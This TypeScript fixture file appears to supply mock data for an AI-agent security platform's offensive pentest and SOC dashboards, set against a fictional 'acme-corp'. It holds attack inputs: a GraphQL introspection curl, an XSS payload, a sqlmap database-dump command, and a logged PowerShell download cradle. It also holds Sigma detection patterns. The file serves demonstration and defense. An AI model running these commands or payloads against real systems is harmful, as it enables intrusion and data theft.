import type {
  Alert,
  Approval,
  ApprovalDecision,
  Asset,
  ChatMessage,
  CredentialPool,
  Engagement,
  Finding,
  GraphEdge,
  GraphNode,
  Hypothesis,
  MonitoredAsset,
  OrchestratorNode,
  ProviderConfig,
  RoutingRule,
  ScopeEntry,
  SigmaRule,
  Skill,
  SocCase,
  TaskItem,
  ToolEntry,
} from "@/lib/types";

const zeroSev = () => ({ critical: 0, high: 0, medium: 0, low: 0, info: 0 });

/* =============================================================================
   Offensive — Engagements
   ========================================================================== */
export const engagements: Engagement[] = [
  {
    id: "eng-acme",
    name: "acme-corp",
    type: "bug-bounty",
    status: "active",
    scopeCount: 42,
    lastActive: "2m ago",
    findingCounts: { critical: 1, high: 3, medium: 5, low: 8, info: 12 },
    workspace: "/workspace/acme-corp",
  },
  {
    id: "eng-northwind",
    name: "northwind-pentest",
    type: "pentest",
    status: "reporting",
    scopeCount: 14,
    lastActive: "3h ago",
    findingCounts: { critical: 2, high: 4, medium: 3, low: 2, info: 4 },
    workspace: "/workspace/northwind",
  },
  {
    id: "eng-globex",
    name: "globex-web",
    type: "bug-bounty",
    status: "paused",
    scopeCount: 27,
    lastActive: "2d ago",
    findingCounts: { critical: 0, high: 1, medium: 6, low: 4, info: 9 },
    workspace: "/workspace/globex",
  },
  {
    id: "eng-initech",
    name: "initech-2024",
    type: "pentest",
    status: "closed",
    scopeCount: 9,
    lastActive: "3w ago",
    findingCounts: { critical: 0, high: 0, medium: 2, low: 3, info: 5 },
    workspace: "/workspace/initech",
  },
];

export const scopeEntries: ScopeEntry[] = [
  { id: "s1", pattern: "*.acme-corp.com", kind: "wildcard", inScope: true, source: "HackerOne" },
  { id: "s2", pattern: "api.acme-corp.com", kind: "domain", inScope: true, source: "HackerOne" },
  { id: "s3", pattern: "app.acme-corp.com", kind: "domain", inScope: true, source: "HackerOne" },
  { id: "s4", pattern: "203.0.113.0/24", kind: "ip", inScope: true, source: "HackerOne" },
  { id: "s5", pattern: "blog.acme-corp.com", kind: "domain", inScope: false, source: "HackerOne" },
  { id: "s6", pattern: "*.internal.acme-corp.com", kind: "wildcard", inScope: false, source: "policy" },
];

/* =============================================================================
   Offensive — Assets (Target Overview)
   ========================================================================== */
export const assets: Asset[] = [
  {
    id: "a1",
    host: "api.acme-corp.com",
    kind: "domain",
    reconStatus: "verified",
    tech: ["nginx", "Node.js", "PostgreSQL"],
    ip: "203.0.113.10",
    ports: [443, 8443],
    webApp: "REST API v3",
    credentials: 2,
    criticality: "crown-jewel",
    findingCounts: { critical: 1, high: 2, medium: 1, low: 1, info: 2 },
    apex: "acme-corp.com",
  },
  {
    id: "a2",
    host: "app.acme-corp.com",
    kind: "domain",
    reconStatus: "verified",
    tech: ["React", "Cloudflare", "AWS"],
    ip: "203.0.113.12",
    ports: [443],
    webApp: "SPA dashboard",
    credentials: 1,
    criticality: "high",
    findingCounts: { critical: 0, high: 1, medium: 2, low: 2, info: 3 },
    apex: "acme-corp.com",
  },
  {
    id: "a3",
    host: "staging.acme-corp.com",
    kind: "subdomain",
    reconStatus: "enumerated",
    tech: ["nginx", "PHP"],
    ip: "203.0.113.21",
    ports: [80, 443],
    webApp: "Legacy admin",
    credentials: 0,
    criticality: "medium",
    findingCounts: { critical: 0, high: 0, medium: 2, low: 3, info: 4 },
    apex: "acme-corp.com",
  },
  {
    id: "a4",
    host: "cdn.acme-corp.com",
    kind: "subdomain",
    reconStatus: "scanning",
    tech: ["Fastly"],
    ip: "203.0.113.30",
    ports: [443],
    credentials: 0,
    criticality: "low",
    findingCounts: { critical: 0, high: 0, medium: 0, low: 1, info: 2 },
    apex: "acme-corp.com",
  },
  {
    id: "a5",
    host: "203.0.113.44",
    kind: "ip",
    reconStatus: "pending",
    tech: [],
    ports: [22, 3306],
    credentials: 0,
    criticality: "medium",
    findingCounts: zeroSev(),
    apex: "203.0.113.0/24",
  },
  {
    id: "a6",
    host: "vpn.acme-corp.com",
    kind: "subdomain",
    reconStatus: "enumerated",
    tech: ["OpenVPN"],
    ip: "203.0.113.51",
    ports: [443, 1194],
    credentials: 3,
    criticality: "high",
    findingCounts: { critical: 0, high: 0, medium: 1, low: 1, info: 1 },
    apex: "acme-corp.com",
  },
];

/* =============================================================================
   Offensive — Findings & Evidence
   ========================================================================== */
export const findings: Finding[] = [
  {
    id: "f1",
    title: "Unauthenticated GraphQL introspection exposes internal schema",
    severity: "critical",
    status: "verified",
    asset: "api.acme-corp.com",
    technique: "Exploit Public-Facing Application",
    techniqueId: "T1190",
    cwe: "CWE-200",
    cvss: 9.1,
    impact:
      "An unauthenticated attacker can map the entire GraphQL schema, revealing internal mutations and PII-bearing types that are not meant to be public.",
    steps: [
      "curl -s https://api.acme-corp.com/graphql -d '{\"query\":\"{__schema{types{name}}}\"}'",
      "Observe full type list returned without an auth token",
      "Enumerate mutations: resetUserPassword, impersonateUser",
    ],
    suggestedFix:
      "Disable introspection in production and require an authenticated session for the /graphql endpoint.",
    evidence: [
      { id: "e1", kind: "request-response", label: "introspection.http", hash: "sha256:9f2a…c41", timestamp: "2026-09-27 14:02" },
      { id: "e2", kind: "screenshot", label: "schema-dump.png", hash: "sha256:1b7e…88a", timestamp: "2026-09-27 14:03" },
      { id: "e3", kind: "log", label: "curl-trace.log", hash: "sha256:44da…0f2", timestamp: "2026-09-27 14:02" },
    ],
  },
  {
    id: "f2",
    title: "IDOR on invoice endpoint allows cross-tenant document access",
    severity: "high",
    status: "verified",
    asset: "api.acme-corp.com",
    technique: "Exploitation for Privilege Escalation",
    techniqueId: "T1068",
    cwe: "CWE-639",
    cvss: 8.2,
    impact: "Any authenticated user can read another tenant's invoices by incrementing the numeric invoice id.",
    steps: [
      "Authenticate as tenant A",
      "GET /api/v3/invoices/10432 → 200 with tenant B data",
      "Iterate ids to harvest cross-tenant documents",
    ],
    suggestedFix: "Enforce tenant-scoped authorization checks on every invoice lookup; use unguessable identifiers.",
    evidence: [
      { id: "e4", kind: "request-response", label: "idor-req.http", hash: "sha256:aa10…931", timestamp: "2026-09-27 12:20" },
      { id: "e5", kind: "poc", label: "idor-poc.mp4", hash: "sha256:77cd…4e1", timestamp: "2026-09-27 12:25" },
    ],
  },
  {
    id: "f3",
    title: "Reflected XSS in search parameter",
    severity: "high",
    status: "verifying",
    asset: "app.acme-corp.com",
    technique: "Drive-by Compromise",
    techniqueId: "T1189",
    cwe: "CWE-79",
    cvss: 7.4,
    impact: "Reflected payload in the q parameter executes in the victim's session context.",
    steps: ["Navigate to /search?q=<svg/onload=alert(1)>", "Payload reflects unescaped in the DOM"],
    suggestedFix: "Contextually encode all reflected user input; adopt a strict CSP.",
    evidence: [{ id: "e6", kind: "screenshot", label: "xss-popup.png", hash: "sha256:0d5f…7ab", timestamp: "2026-09-27 11:04" }],
  },
  {
    id: "f4",
    title: "Verbose error discloses stack traces and DB driver version",
    severity: "medium",
    status: "new",
    asset: "staging.acme-corp.com",
    technique: "Gather Victim Host Information",
    techniqueId: "T1592",
    cwe: "CWE-209",
    cvss: 5.3,
    impact: "500 responses leak framework and database versions, aiding targeted exploitation.",
    steps: ["POST malformed JSON to /admin/login", "Full stack trace returned in the response body"],
    suggestedFix: "Return generic error pages in production; log detail server-side only.",
    evidence: [{ id: "e7", kind: "request-response", label: "trace.http", hash: "sha256:e34a…120", timestamp: "2026-09-26 18:41" }],
  },
  {
    id: "f5",
    title: "Missing rate limiting on password-reset endpoint",
    severity: "medium",
    status: "new",
    asset: "api.acme-corp.com",
    technique: "Brute Force",
    techniqueId: "T1110",
    cwe: "CWE-307",
    cvss: 5.9,
    impact: "Token guessing / user enumeration is possible without throttling.",
    steps: ["Send 500 reset requests in 60s", "No lockout or throttle observed"],
    suggestedFix: "Add per-account and per-IP rate limiting with exponential backoff.",
    evidence: [],
  },
  {
    id: "f6",
    title: "Cookie missing Secure and HttpOnly flags",
    severity: "low",
    status: "reported",
    asset: "app.acme-corp.com",
    technique: "Steal Web Session Cookie",
    techniqueId: "T1539",
    cwe: "CWE-1004",
    cvss: 3.4,
    impact: "Session cookie is exposed to script and cleartext channels.",
    steps: ["Inspect Set-Cookie header on login response"],
    suggestedFix: "Set Secure, HttpOnly and SameSite=Lax on all session cookies.",
    evidence: [],
  },
  {
    id: "f7",
    title: "Server banner reveals nginx build",
    severity: "info",
    status: "new",
    asset: "cdn.acme-corp.com",
    technique: "Gather Victim Host Information",
    techniqueId: "T1592",
    cwe: "CWE-200",
    cvss: 0,
    impact: "Version disclosure only; low individual risk.",
    steps: ["curl -I https://cdn.acme-corp.com"],
    suggestedFix: "Suppress the Server response header.",
    evidence: [],
  },
];

/* =============================================================================
   Offensive — Approval Queue
   ========================================================================== */
export const approvals: Approval[] = [
  {
    id: "ap1",
    intent: "RUN_EXPLOIT",
    skill: "sqlmap-exploit",
    target: "api.acme-corp.com/v3/reports?id=1",
    targetInScope: true,
    requestedBy: "Exploit subagent",
    origin: "direct",
    command: "sqlmap -u 'https://api.acme-corp.com/v3/reports?id=1' --batch --dbs --risk=2 --level=3",
    createdAt: "just now",
  },
  {
    id: "ap2",
    intent: "WRITE_FILE",
    skill: "report-writer",
    target: "/workspace/acme-corp/findings/f1.md",
    targetInScope: true,
    requestedBy: "Report-Writer subagent",
    origin: "execute_code",
    command: "write_file('/workspace/acme-corp/findings/f1.md', rendered_markdown)",
    createdAt: "1m ago",
  },
  {
    id: "ap3",
    intent: "EGRESS_CALL",
    skill: "osint-enrich",
    target: "https://api.shodan.io/host/203.0.113.10",
    targetInScope: true,
    requestedBy: "Recon subagent",
    origin: "direct",
    command: "GET https://api.shodan.io/host/203.0.113.10?key=***",
    createdAt: "3m ago",
  },
];

export const approvalHistory: ApprovalDecision[] = [
  { id: "ah1", intent: "RUN_EXPLOIT", skill: "nuclei-verify", target: "app.acme-corp.com", decision: "approved", at: "12m ago" },
  { id: "ah2", intent: "EGRESS_CALL", skill: "osint-enrich", target: "blog.acme-corp.com", decision: "denied", at: "24m ago" },
  { id: "ah3", intent: "WRITE_FILE", skill: "report-writer", target: "/workspace/acme-corp/notes.md", decision: "approved", at: "1h ago" },
];

/* =============================================================================
   Offensive — Orchestrator tree + chat + tasks
   ========================================================================== */
export const orchestratorTree: OrchestratorNode[] = [
  { id: "orch", name: "Orchestrator", role: "orchestrator", status: "thinking", task: "Planning verification of finding f1", activity: [2, 4, 3, 6, 5, 7, 4, 8] },
  { id: "recon", name: "Recon", role: "subagent", status: "idle", task: "Subdomain enumeration complete", activity: [1, 2, 1, 3, 2, 1, 1, 2] },
  { id: "vuln", name: "Vuln-Scan", role: "subagent", status: "running-tool", task: "nuclei against app.acme-corp.com", activity: [3, 5, 4, 6, 5, 6, 7, 6] },
  { id: "exploit", name: "Exploit", role: "subagent", status: "awaiting-approval", task: "sqlmap on reports endpoint", activity: [1, 1, 2, 1, 5, 8, 6, 4] },
  { id: "report", name: "Report-Writer", role: "subagent", status: "idle", task: "Idle — 2 findings staged", activity: [0, 1, 0, 1, 0, 0, 1, 0] },
];

export const chatSeed: ChatMessage[] = [
  { id: "m1", author: "operator", text: "Enumerate subdomains for acme-corp.com and flag anything with an exposed API.", at: "14:00" },
  { id: "m2", author: "agent", text: "Starting recon. I'll run subfinder + httpx, then probe for GraphQL and REST endpoints. I'll pause for approval before any active exploitation.", at: "14:00" },
  {
    id: "m3",
    author: "agent",
    toolCall: {
      id: "tc1",
      command: "subfinder -d acme-corp.com -silent | httpx -sc -title -tech-detect",
      status: "done",
      output: "api.acme-corp.com [200] [REST API v3] [nginx]\napp.acme-corp.com [200] [SPA dashboard] [cloudflare]\nstaging.acme-corp.com [200] [Legacy admin] [php]\nvpn.acme-corp.com [200] [OpenVPN]\ncdn.acme-corp.com [200] [fastly]",
      summary: "5 live hosts. api.acme-corp.com exposes a REST API and a GraphQL endpoint.",
    },
    subagent: "Recon",
    at: "14:01",
  },
  { id: "m4", author: "agent", text: "Found a GraphQL endpoint on api.acme-corp.com with introspection enabled. This is likely a Critical. I'd like to verify it.", at: "14:02" },
  { id: "m5", author: "system", checkpoint: { label: "Checkpoint saved before verification" }, at: "14:02" },
  {
    id: "m6",
    author: "agent",
    toolCall: {
      id: "tc2",
      command: "sqlmap -u 'https://api.acme-corp.com/v3/reports?id=1' --batch --dbs",
      status: "pending-approval",
    },
    subagent: "Exploit",
    approval: "ap1",
    at: "14:03",
  },
];

export const defensiveChatSeed: ChatMessage[] = [
  { id: "dm1", author: "operator", text: "Investigate the encoded PowerShell alert on web-prod-2 and tell me if it's a real incident.", at: "09:40" },
  { id: "dm2", author: "agent", text: "Pulling the alert context from Wazuh and correlating with recent process events. I'll classify it and open a case if it's real.", at: "09:40" },
  {
    id: "dm3",
    author: "agent",
    toolCall: {
      id: "dtc1",
      command: "wazuh query --rule 91802 --agent web-prod-2 --last 1h",
      status: "done",
      output: "09:38:02 EncodedCommand → FromBase64String → DownloadString('http://203.0.113.200/a.ps1')\nParent: winword.exe  User: svc_report",
      summary: "Decoded to a download cradle spawned from winword.exe. This is a real execution, not a false positive.",
    },
    subagent: "Triage",
    at: "09:41",
  },
  { id: "dm4", author: "agent", text: "Confirmed malicious. I've opened case ps-cradle-web-prod-2 (Critical) and drafted a containment step. Want me to isolate the host?", at: "09:42" },
];

export const planTasks: TaskItem[] = [
  { id: "t1", label: "Recon: passive + active subdomain enumeration", status: "done" },
  { id: "t2", label: "Fingerprint tech stack on every live host", status: "done" },
  { id: "t3", label: "Probe API surface (REST + GraphQL)", status: "running" },
  { id: "t4", label: "Verify GraphQL introspection exposure", status: "blocked" },
  { id: "t5", label: "Authenticated IDOR sweep on invoice endpoints", status: "todo" },
  { id: "t6", label: "Draft HackerOne report for confirmed findings", status: "todo" },
];

/* =============================================================================
   Offensive — Threat Map graph data
   ========================================================================== */
export const surfaceNodes: GraphNode[] = [
  { id: "apex", label: "acme-corp.com", type: "domain", x: 0.5, y: 0.5, findings: 0, cluster: "acme" },
  { id: "n-api", label: "api", type: "subdomain", x: 0.72, y: 0.32, severity: "critical", findings: 4, cluster: "acme" },
  { id: "n-app", label: "app", type: "subdomain", x: 0.74, y: 0.62, severity: "high", findings: 3, cluster: "acme" },
  { id: "n-staging", label: "staging", type: "subdomain", x: 0.3, y: 0.28, severity: "medium", findings: 2, cluster: "acme" },
  { id: "n-vpn", label: "vpn", type: "subdomain", x: 0.28, y: 0.7, severity: "low", findings: 1, cluster: "acme" },
  { id: "n-cdn", label: "cdn", type: "subdomain", x: 0.52, y: 0.82, severity: "info", findings: 1, cluster: "acme" },
  { id: "r-graphql", label: "/graphql", type: "risk", x: 0.9, y: 0.22, severity: "critical", findings: 1 },
  { id: "r-idor", label: "/invoices", type: "risk", x: 0.92, y: 0.42, severity: "high", findings: 1 },
  { id: "r-xss", label: "/search", type: "risk", x: 0.9, y: 0.7, severity: "high", findings: 1 },
  { id: "cluster-ip", label: "203.0.113.0/24", type: "cluster", x: 0.16, y: 0.48, count: 24 },
];
export const surfaceEdges: GraphEdge[] = [
  { id: "se1", source: "apex", target: "n-api" },
  { id: "se2", source: "apex", target: "n-app" },
  { id: "se3", source: "apex", target: "n-staging" },
  { id: "se4", source: "apex", target: "n-vpn" },
  { id: "se5", source: "apex", target: "n-cdn" },
  { id: "se6", source: "n-api", target: "r-graphql" },
  { id: "se7", source: "n-api", target: "r-idor" },
  { id: "se8", source: "n-app", target: "r-xss" },
  { id: "se9", source: "apex", target: "cluster-ip" },
];

export const chainNodes: GraphNode[] = [
  { id: "c1", label: "GraphQL introspection", type: "step", step: 1, techniqueId: "T1190", severity: "critical", x: 0.12, y: 0.5 },
  { id: "c2", label: "Harvest admin mutations", type: "step", step: 2, techniqueId: "T1078", severity: "high", x: 0.37, y: 0.5 },
  { id: "c3", label: "Cross-tenant IDOR", type: "step", step: 3, techniqueId: "T1068", severity: "high", x: 0.62, y: 0.5 },
  { id: "c4", label: "Exfiltrate invoice PII", type: "step", step: 4, techniqueId: "TA0010", severity: "critical", x: 0.87, y: 0.5 },
];
export const chainEdges: GraphEdge[] = [
  { id: "ce1", source: "c1", target: "c2", directed: true, label: "1" },
  { id: "ce2", source: "c2", target: "c3", directed: true, label: "2" },
  { id: "ce3", source: "c3", target: "c4", directed: true, label: "3" },
];

/* =============================================================================
   Skills & Tools
   ========================================================================== */
export const offensiveSkills: Skill[] = [
  { id: "sk1", name: "subdomain-enum", platform: "offensive", tactic: "Reconnaissance", technique: "Active Scanning", techniqueId: "T1595", toolDeps: ["subfinder", "httpx"], sensitivity: "none", enabled: true, description: "Passive + active subdomain discovery and liveness probing." },
  { id: "sk2", name: "nuclei-verify", platform: "offensive", tactic: "Initial Access", technique: "Exploit Public-Facing App", techniqueId: "T1190", toolDeps: ["nuclei"], sensitivity: "RUN_EXPLOIT", enabled: true, description: "Template-driven vulnerability verification." },
  { id: "sk3", name: "sqlmap-exploit", platform: "offensive", tactic: "Initial Access", technique: "Exploit Public-Facing App", techniqueId: "T1190", toolDeps: ["sqlmap"], sensitivity: "RUN_EXPLOIT", enabled: true, description: "Automated SQL injection detection and exploitation." },
  { id: "sk4", name: "osint-enrich", platform: "offensive", tactic: "Reconnaissance", technique: "Gather Victim Network Information", techniqueId: "T1590", toolDeps: ["shodan", "amass"], sensitivity: "EGRESS_CALL", enabled: true, description: "Enrich assets with third-party OSINT APIs." },
  { id: "sk5", name: "idor-sweep", platform: "offensive", tactic: "Privilege Escalation", technique: "Exploitation for Priv Esc", techniqueId: "T1068", toolDeps: ["custom"], sensitivity: "RUN_EXPLOIT", enabled: false, description: "Authenticated object-reference fuzzing across tenants." },
  { id: "sk6", name: "report-hackerone", platform: "reporting", tactic: "—", technique: "—", techniqueId: "—", toolDeps: [], sensitivity: "WRITE_FILE", enabled: true, description: "Render findings into HackerOne submission format." },
];

export const offensiveTools: ToolEntry[] = [
  { id: "to1", name: "subfinder", installed: true, selfHeal: true, enabled: true, category: "recon" },
  { id: "to2", name: "httpx", installed: true, selfHeal: true, enabled: true, category: "recon" },
  { id: "to3", name: "nmap", installed: true, selfHeal: false, enabled: true, category: "recon" },
  { id: "to4", name: "nuclei", installed: true, selfHeal: true, enabled: true, category: "scan" },
  { id: "to5", name: "ffuf", installed: false, selfHeal: true, enabled: true, category: "fuzz" },
  { id: "to6", name: "sqlmap", installed: true, selfHeal: true, enabled: true, category: "exploit" },
  { id: "to7", name: "headless-browser", installed: true, selfHeal: true, enabled: true, category: "browser" },
];

/* =============================================================================
   Providers / Settings
   ========================================================================== */
export const providers: ProviderConfig[] = [
  { id: "p1", name: "Anthropic", baseUrl: "https://api.anthropic.com", keyMasked: "sk-ant-••••••••4f2a", defaultModel: "claude-opus-4-8", status: "ready", models: ["claude-opus-4-8", "claude-sonnet-5", "claude-haiku-4-5"] },
  { id: "p2", name: "Local vLLM", baseUrl: "http://localhost:8000/v1", keyMasked: "••••••••", defaultModel: "qwen2.5-72b", status: "unverified", models: ["qwen2.5-72b", "llama-3.3-70b"] },
];

export const routingRules: RoutingRule[] = [
  { id: "r1", taskClass: "Recon parsing", model: "claude-haiku-4-5" },
  { id: "r2", taskClass: "Exploit reasoning", model: "claude-opus-4-8" },
  { id: "r3", taskClass: "Report drafting", model: "claude-sonnet-5" },
];

export const credentialPools: CredentialPool[] = [
  { id: "cp1", name: "Shodan keys", keyCount: 4, purpose: "OSINT enrichment (rate-limited)" },
  { id: "cp2", name: "VirusTotal", keyCount: 2, purpose: "File / hash reputation" },
];

export const mountRoots = ["/workspace", "/data/engagements"];

/* =============================================================================
   Defensive
   ========================================================================== */
export const monitoredAssets: MonitoredAsset[] = [
  { id: "ma1", name: "dc01.corp.local", health: "healthy" },
  { id: "ma2", name: "web-prod-1", health: "healthy" },
  { id: "ma3", name: "web-prod-2", health: "degraded" },
  { id: "ma4", name: "mail-gw", health: "healthy" },
  { id: "ma5", name: "vpn-01", health: "down" },
];

export const alerts: Alert[] = [
  { id: "al1", time: "09:42:11", source: "Wazuh", rule: "Multiple failed logins then success", severity: "high", asset: "dc01.corp.local", suggestion: "escalate", description: "15 failed SSH auths from 198.51.100.23 followed by a success." },
  { id: "al2", time: "09:38:02", source: "Wazuh", rule: "Suspicious PowerShell encoded command", severity: "critical", asset: "web-prod-2", suggestion: "escalate", description: "EncodedCommand base64 payload decoded to a download cradle." },
  { id: "al3", time: "09:30:55", source: "Suricata", rule: "Outbound to known C2 IP", severity: "high", asset: "vpn-01", suggestion: "investigate", description: "TLS beacon to 203.0.113.200 every 60s." },
  { id: "al4", time: "09:12:40", source: "Wazuh", rule: "New local admin account created", severity: "medium", asset: "web-prod-1", suggestion: "investigate", description: "net user /add observed outside change window." },
  { id: "al5", time: "08:59:19", source: "CloudTrail", rule: "Root API key used", severity: "medium", asset: "aws-prod", suggestion: "investigate", description: "Root credentials used for DescribeInstances." },
  { id: "al6", time: "08:41:03", source: "Wazuh", rule: "Antivirus signature update", severity: "info", asset: "mail-gw", suggestion: "likely-fp", description: "Scheduled Defender definition update." },
  { id: "al7", time: "08:22:47", source: "Suricata", rule: "Port scan detected", severity: "low", asset: "web-prod-1", suggestion: "likely-fp", description: "Internal vuln scanner sweep, known source." },
];

export const socCases: SocCase[] = [
  {
    id: "case1",
    name: "Suspected credential-stuffing on VPN",
    status: "contained",
    severity: "high",
    opened: "2026-09-27 08:10",
    owner: "you",
    timeline: [
      { id: "t1", at: "08:10", kind: "event", text: "Alert al3 fired: outbound C2 beacon from vpn-01.", actor: "Suricata" },
      { id: "t2", at: "08:14", kind: "action", text: "Triage subagent correlated with 3 prior auth-failure alerts.", actor: "Triage agent" },
      { id: "t3", at: "08:20", kind: "action", text: "Isolated vpn-01 from the network (contained).", actor: "you" },
      { id: "t4", at: "08:26", kind: "artifact", text: "Captured memory image vpn-01.mem for analysis.", actor: "IR agent" },
    ],
    checklist: [
      { id: "c1", label: "Identify affected accounts", done: true },
      { id: "c2", label: "Contain affected host", done: true },
      { id: "c3", label: "Rotate exposed credentials", done: false },
      { id: "c4", label: "Eradicate persistence", done: false },
      { id: "c5", label: "Restore service", done: false },
    ],
    evidence: [
      { id: "de1", kind: "log", label: "vpn-auth.log", hash: "sha256:5a1c…9b2", timestamp: "2026-09-27 08:12" },
      { id: "de2", kind: "poc", label: "vpn-01.mem", hash: "sha256:c0ff…e33", timestamp: "2026-09-27 08:26" },
    ],
  },
  {
    id: "case2",
    name: "PowerShell download cradle on web-prod-2",
    status: "open",
    severity: "critical",
    opened: "2026-09-27 09:38",
    owner: "you",
    timeline: [{ id: "t1", at: "09:38", kind: "event", text: "Alert al2 fired: encoded PowerShell on web-prod-2.", actor: "Wazuh" }],
    checklist: [
      { id: "c1", label: "Identify affected accounts", done: false },
      { id: "c2", label: "Contain affected host", done: false },
      { id: "c3", label: "Collect forensic artifacts", done: false },
    ],
    evidence: [],
  },
];

export const hypotheses: Hypothesis[] = [
  { id: "h1", text: "Attacker used valid VPN creds from a prior breach", column: "confirmed", evidence: "Matched leaked-cred dataset; 2 accounts hit." },
  { id: "h2", text: "Lateral movement to domain controller via SMB", column: "investigating", evidence: "Checking dc01 SMB session logs." },
  { id: "h3", text: "Persistence via scheduled task on web-prod-2", column: "hypothesis", evidence: "Not yet examined." },
  { id: "h4", text: "Data staged in /tmp before exfil", column: "ruled-out", evidence: "No large archives found on disk." },
];

export const sigmaRules: SigmaRule[] = [
  {
    id: "sr1",
    title: "GraphQL introspection query from untrusted source",
    status: "draft",
    techniqueId: "T1190",
    fromOffensive: true,
    testHits: 3,
    yaml: `title: GraphQL Introspection From Untrusted Source
status: experimental
logsource:
  product: nginx
detection:
  selection:
    uri|contains: '__schema'
  condition: selection
level: high`,
  },
  {
    id: "sr2",
    title: "Encoded PowerShell download cradle",
    status: "deployed",
    techniqueId: "T1059.001",
    fromOffensive: false,
    testHits: 12,
    yaml: `title: Encoded PowerShell Download Cradle
status: stable
logsource:
  product: windows
  service: powershell
detection:
  selection:
    ScriptBlockText|contains:
      - 'FromBase64String'
      - 'DownloadString'
  condition: selection
level: critical`,
  },
];

/* ATT&CK heatmap — tactic columns × technique rows, coverage 0-3 */
export const attackTactics = ["Recon", "Initial Access", "Execution", "Persistence", "Priv Esc", "Exfiltration"];
export const attackHeatmap: { technique: string; coverage: number[] }[] = [
  { technique: "T1595", coverage: [3, 0, 0, 0, 0, 0] },
  { technique: "T1190", coverage: [0, 1, 0, 0, 0, 0] },
  { technique: "T1059", coverage: [0, 0, 3, 0, 0, 0] },
  { technique: "T1078", coverage: [0, 2, 0, 1, 2, 0] },
  { technique: "T1053", coverage: [0, 0, 1, 3, 0, 0] },
  { technique: "T1068", coverage: [0, 0, 0, 0, 1, 0] },
  { technique: "T1041", coverage: [0, 0, 0, 0, 0, 2] },
];

/* Coverage-map graph (ATT&CK/D3FEND) — gaps vs covered */
export const coverageNodes: GraphNode[] = [
  { id: "cov-recon", label: "Recon", type: "cluster", x: 0.15, y: 0.5, count: 8 },
  { id: "cov-ia", label: "Initial Access", type: "cluster", x: 0.38, y: 0.35, count: 6 },
  { id: "cov-exec", label: "Execution", type: "cluster", x: 0.6, y: 0.6, count: 5 },
  { id: "cov-t1190", label: "T1190", type: "risk", severity: "critical", x: 0.5, y: 0.2, findings: 1 },
  { id: "cov-t1059", label: "T1059.001", type: "endpoint", severity: "info", x: 0.75, y: 0.7, findings: 0 },
  { id: "cov-t1078", label: "T1078", type: "risk", severity: "high", x: 0.62, y: 0.32, findings: 1 },
];
export const coverageEdges: GraphEdge[] = [
  { id: "cv1", source: "cov-recon", target: "cov-ia" },
  { id: "cv2", source: "cov-ia", target: "cov-t1190" },
  { id: "cv3", source: "cov-ia", target: "cov-t1078" },
  { id: "cv4", source: "cov-ia", target: "cov-exec" },
  { id: "cv5", source: "cov-exec", target: "cov-t1059" },
];

export const defensiveSkills: Skill[] = [
  { id: "dsk1", name: "alert-triage", platform: "defensive", tactic: "Detection", technique: "Alert Correlation", techniqueId: "—", toolDeps: ["wazuh-mcp"], sensitivity: "none", enabled: true, description: "Correlate and classify incoming alerts; flag likely false positives." },
  { id: "dsk2", name: "sigma-draft", platform: "defensive", tactic: "Detection", technique: "Rule Authoring", techniqueId: "—", toolDeps: [], sensitivity: "WRITE_FILE", enabled: true, description: "Draft Sigma rules from a confirmed technique." },
  { id: "dsk3", name: "threat-hunt-query", platform: "defensive", tactic: "Hunting", technique: "Hypothesis-driven Search", techniqueId: "—", toolDeps: ["wazuh-mcp"], sensitivity: "EGRESS_CALL", enabled: true, description: "Run saved hunting queries against historical logs." },
];

export const defensiveTools: ToolEntry[] = [
  { id: "dto1", name: "wazuh-mcp", installed: true, selfHeal: false, enabled: true, category: "siem" },
  { id: "dto2", name: "sigma-cli", installed: true, selfHeal: true, enabled: true, category: "detection" },
  { id: "dto3", name: "yara", installed: false, selfHeal: true, enabled: false, category: "analysis" },
];
